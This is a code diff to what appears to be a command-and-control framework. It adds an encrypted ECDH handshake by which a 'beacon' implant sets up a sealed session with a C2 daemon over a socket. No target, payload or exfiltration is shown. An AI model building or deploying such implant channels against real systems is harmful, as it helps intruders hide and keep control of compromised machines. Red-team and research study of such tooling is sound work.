@@ -11,6 +11,7 @@ import time
 import random
 from typing import Any, Dict, Optional
 
+from c2.handshake import HandshakeClient, Session
 from core.crypto import Crypto
 
 logger = logging.getLogger("void.c2.beacon")
@@ -28,7 +29,27 @@ class Beacon:
         self.failed = 0
         self.last_checkin = time.time()
         self.active = True
+        self.session: Optional[Session] = None
         logger.info(f"Beacon {self.beacon_id} initialized")
+
+    def perform_handshake(self, sock) -> Session:
+        """Run the ECDH handshake with a C2 daemon over ``sock``.
+
+        On success the beacon stores the session and uses it to seal all
+        subsequent traffic. Raises on any handshake failure.
+        """
+        client = HandshakeClient(self.beacon_id, crypto=self.crypto)
+        hello = client.hello()
+        sock.send(self.crypto.encrypt(json.dumps(hello)).encode())
+        reply_blob = sock.recv(65536)
+        reply = json.loads(self.crypto.decrypt(reply_blob.decode()))
+        confirm, session = client.process_reply(reply)
+        sock.send(self.crypto.encrypt(json.dumps(confirm)).encode())
+        ack_blob = sock.recv(65536)
+        session.open(ack_blob.decode())  # session-sealed ack
+        self.session = session
+        logger.info(f"Beacon {self.beacon_id} handshake complete")
+        return session
 
     def _generate_id(self) -> str:
         """Generate a unique beacon ID."""
